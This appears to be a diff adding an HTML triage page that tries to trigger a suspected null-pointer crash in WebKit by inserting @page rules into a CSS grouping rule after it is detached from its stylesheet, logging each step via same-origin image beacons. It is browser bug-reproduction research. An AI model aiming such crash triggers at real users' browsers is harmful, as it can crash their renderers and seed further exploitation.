@@ -1,0 +1,59 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>candidate triage: @page selector on a detached grouping rule</title>
+<!--
+  Candidate `cc88e18743` (docs/67 row 8): CSSParserImpl::parsePageSelector() dereferences its
+  StyleSheetContents* argument unconditionally (Source/WebCore/css/parser/CSSParserImpl.cpp:230
+  and :239 in the Sony 1400 drop). CSSGroupingRule::insertRule passes nullptr for a rule whose
+  parentStyleSheet() is null (CSSGroupingRule.cpp:174), so a rule that has been removed from its
+  sheet but is still alive in JS should reach defaultNamespace() through a null pointer.
+
+  Knobs (one variable per run):
+    at=0  control: insert the @page rule while the grouping rule is still in the sheet
+    at=1  deleteRule(0) first, then insert "@page foo {}"        (typeSelector, no pseudo)
+    at=2  deleteRule(0) first, then insert "@page foo:first {}"  (typeSelector + pseudo)
+    at=3  deleteRule(0) first, then insert "@page {}"            (neither branch: must not crash)
+  sel=  page name (default foo)
+
+  Scored only from the beacon log (new Image().src='/ev?m=...'), never from page state.
+-->
+<body><div id="d">x</div>
+<script>
+const Q = new URLSearchParams(location.search);
+const AT = Q.get('at') || '1';
+const SEL = Q.get('sel') || 'foo';
+const ev = m => { new Image().src = '/ev?m=' + encodeURIComponent(m); };
+
+ev('start at=' + AT + ' sel=' + SEL);
+
+const st = document.createElement('style');
+st.textContent = '@media all { rect { color: red } }';
+document.head.appendChild(st);
+document.body.offsetHeight;                       // make sure the sheet is realised
+const sheet = st.sheet || document.styleSheets[document.styleSheets.length - 1];
+ev('sheet=' + (sheet ? 'ok' : 'null') + ' rules=' + (sheet ? sheet.cssRules.length : -1));
+if (!sheet || !sheet.cssRules.length) { ev('ABORT no-sheet'); throw new Error('no sheet'); }
+
+const media = sheet.cssRules[0];
+ev('rule=' + media.constructor.name + ' childRules=' + media.cssRules.length);
+
+if (AT === '1' || AT === '2' || AT === '3')
+    sheet.deleteRule(0);
+
+ev('after-delete ps=' + String(media.parentStyleSheet) + ' sheetRules=' + sheet.cssRules.length);
+
+let text;
+if (AT === '3')
+    text = '@page {}';
+else
+    text = '@page ' + SEL + (AT === '2' ? ':first' : '') + ' {}';
+
+ev('BEFORE ' + text);
+try {
+    const idx = media.insertRule(text, 0);
+    ev('AFTER ok idx=' + idx + ' childRules=' + media.cssRules.length);
+} catch (e) {
+    ev('AFTER throw ' + e.name);
+}
+ev('done');
+</script>
